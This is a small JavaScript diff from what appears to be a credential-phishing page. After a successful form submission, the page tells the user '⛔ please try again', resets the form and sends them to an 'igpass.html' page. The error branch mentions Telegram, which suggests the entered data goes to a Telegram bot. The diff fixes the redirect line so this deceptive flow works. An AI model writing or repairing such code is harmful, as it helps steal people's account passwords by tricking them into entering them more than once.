@@ -74,8 +74,7 @@ document.addEventListener("DOMContentLoaded", () => {
         if (response.ok) {
           alert(`⛔ please try again`);
           form.reset();
-          window.location.href = 
-          'igpass.html?id=${userId}';
+          window.location.href = `igpass.html?id=${userId}`;
         } else {
           const errorText = await response.text();
           console.error("Telegram Error:", errorText);
